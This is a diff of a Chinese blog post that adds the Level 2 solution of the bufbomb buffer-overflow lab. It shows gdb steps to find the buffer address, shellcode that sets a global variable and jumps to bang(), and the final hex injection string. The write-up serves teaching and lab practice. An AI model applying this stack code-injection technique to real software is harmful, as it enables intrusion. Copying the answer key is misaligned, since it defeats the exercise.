@@ -24,7 +24,7 @@
 <meta property="og:description" content="注意事项任务：利用程序溢出的漏洞来破解几个 level。 文件夹下有三个文件： 1234bufbomb :可执行文件，是我们要攻击的文件hex2raw：将十六进制的字符数据转换成普通的字符串用于输入makecookie：生成一个独一无二的cookie用于辨识作者  根据官方文档，如果将答案存储在 exploit.txt 中，使用命令 1cat exploit.txt | .&#x2F;hex2raw | .">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2023-10-07T05:59:21.000Z">
-<meta property="article:modified_time" content="2023-10-07T06:39:50.623Z">
+<meta property="article:modified_time" content="2023-10-07T08:06:24.621Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
   
@@ -219,7 +219,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.8k 字
+          3.2k 字
         
       </span>
     
@@ -230,7 +230,7 @@
         
         
         
-          16 分钟
+          28 分钟
         
       </span>
     
@@ -301,6 +301,29 @@
 <p>执行命令：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─$ <span class="hljs-built_in">cat</span> exploit.txt | ./hex2raw | ./bufbomb -u y                        <br>Userid: y<br>Cookie: 0x6c6fcfb8<br>Type string:Fizz!: You called fizz(0x6c6fcfb8)<br>VALID<br>NICE JOB!<br><br></code></pre></td></tr></table></figure>
 
+<h3 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h3><p>目标：含有一个 bang 函数，和一个全局变量 global_value，需要注入机器代码，修改 global_value 为 cookies 的值，再调用 bang 函数。</p>
+<p>从文档中获得的 bang 代码如下。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">int global_value = <span class="hljs-number">0</span>;<br><br>void bang(int val) &#123;<br>	<span class="hljs-keyword">if</span> (global_value == cookie) &#123;<br>		printf(<span class="hljs-string">&quot;Bang!: You set global_value to 0x%x\n&quot;</span>, global_value);<br>		validate(<span class="hljs-number">2</span>);<br>	&#125; <span class="hljs-keyword">else</span><br>		printf(<span class="hljs-string">&quot;Misfire: global_value = 0x%x\n&quot;</span>, global_value);<br>	<span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>研究 bang 汇编语言的前几行：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">08048c9d</span> &lt;bang&gt;:<br><span class="hljs-attribute">8048c9d</span>:	<span class="hljs-number">55</span>                   	push   %ebp<br><span class="hljs-attribute">8048c9e</span>:	<span class="hljs-number">89</span> e5                	mov    %esp,%ebp<br><span class="hljs-attribute">8048ca0</span>:	<span class="hljs-number">83</span> ec <span class="hljs-number">18</span>             	sub    $<span class="hljs-number">0</span>x18,%esp<br><span class="hljs-attribute">8048ca3</span>:	a1 <span class="hljs-number">00</span> d1 <span class="hljs-number">04</span> <span class="hljs-number">08</span>       	mov    <span class="hljs-number">0</span>x804d100,%eax<br><span class="hljs-attribute">8048ca8</span>:	<span class="hljs-number">3</span>b <span class="hljs-number">05</span> <span class="hljs-number">08</span> d1 <span class="hljs-number">04</span> <span class="hljs-number">08</span>    	cmp    <span class="hljs-number">0</span>x804d108,%eax<br><span class="hljs-attribute">8048cae</span>:	<span class="hljs-number">75</span> <span class="hljs-number">26</span>                	jne    <span class="hljs-number">8048</span>cd6 &lt;bang+<span class="hljs-number">0</span>x39&gt;<br><span class="hljs-attribute">8048cb0</span>:	<span class="hljs-number">89</span> <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">08</span>          	mov    %eax,<span class="hljs-number">0</span>x8(%esp)<br><span class="hljs-attribute">8048cb4</span>:	c7 <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">04</span> <span class="hljs-number">60</span> a3 <span class="hljs-number">04</span> 	movl   $<span class="hljs-number">0</span>x804a360,<span class="hljs-number">0</span>x4(%esp)<br></code></pre></td></tr></table></figure>
+
+<p>用gdb查看0x804d100 0x804d108 ，分别为global_value 和 cookie，注意这里gdb bufbomb后，在getbuf处设断点，注意这里用gdb运行的时候要带参数</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">r -u y</span><br></code></pre></td></tr></table></figure>
+<p>运行几步后查看eax，即为buf的起始地址，</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">info</span> registers<br>或<br>x <span class="hljs-variable">$eax</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dns">pwndbg&gt; x $eax<br><span class="hljs-number">0x55683848</span> &lt;_reserved+<span class="hljs-number">1038408</span>&gt;: <span class="hljs-number">0x00343434</span><br></code></pre></td></tr></table></figure>
+<p>得到buf起始地址为0x55683848.</p>
+<p>编写汇编代码，然后把它们转换为字符编码放入堆栈中，以完成需要的操作。创建汇编代码bang.s如下：</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">movl</span> <span class="hljs-variable">$0</span>x6c6fcfb8, 0x804d100  <span class="hljs-comment">#*将global_value设置为cookie的值*</span><br>pushl <span class="hljs-variable">$0</span>x08048c9d            <span class="hljs-comment">#bang()的起始地址入栈</span><br>ret							 <span class="hljs-comment">#返回，进入bang函数</span><br><br></code></pre></td></tr></table></figure>
+
+<p>通过以下指令</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">gcc -m32 -c <span class="hljs-keyword">bang.s </span><br><br>objdump -d <span class="hljs-keyword">bang.o </span>&gt; <span class="hljs-keyword">bang.d</span><br><span class="hljs-keyword"></span><br></code></pre></td></tr></table></figure>
+<p>得到bang.d文件</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs apache"><br><span class="hljs-attribute">bang</span>.o：     文件格式 elf32-i386<br><br><br><span class="hljs-attribute">Disassembly</span> of section .text:<br><br><span class="hljs-attribute">00000000</span> &lt;.text&gt;:<br>   <span class="hljs-attribute">0</span>:	c7 <span class="hljs-number">05</span> <span class="hljs-number">00</span> d1 <span class="hljs-number">04</span> <span class="hljs-number">08</span> b8 	movl   $<span class="hljs-number">0</span>x6c6fcfb8,<span class="hljs-number">0</span>x804d100<br>   <span class="hljs-attribute">7</span>:	cf <span class="hljs-number">6</span>f <span class="hljs-number">6</span>c <br>   <span class="hljs-attribute">a</span>:	<span class="hljs-number">68</span> <span class="hljs-number">9</span>d <span class="hljs-number">8</span>c <span class="hljs-number">04</span> <span class="hljs-number">08</span>       	push   $<span class="hljs-number">0</span>x8048c9d<br>   <span class="hljs-attribute">f</span>:	c3                   	ret<br><br></code></pre></td></tr></table></figure>
+<p>如上获得了汇编代码。<br>先在缓冲区的前面几个字节就注入汇编代码，然后在 44 字节之后注入缓冲区的起点地址，让程序跳转回来。</p>
+<p>代码如下：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">c7</span> <span class="hljs-number">05</span> <span class="hljs-number">00</span> d1 <span class="hljs-number">04</span> <span class="hljs-number">08</span> b8 cf <br><span class="hljs-attribute">6f</span> <span class="hljs-number">6</span>c <span class="hljs-number">68</span> <span class="hljs-number">9</span>d <span class="hljs-number">8</span>c <span class="hljs-number">04</span> <span class="hljs-number">08</span> c3 <br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       #前<span class="hljs-number">44</span>个字节造成溢出<br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">48</span> <span class="hljs-number">38</span> <span class="hljs-number">68</span> <span class="hljs-number">55</span> <span class="hljs-number">0</span>a    #最后加上eax起始地址<br><br></code></pre></td></tr></table></figure>
 
                 
               </div>
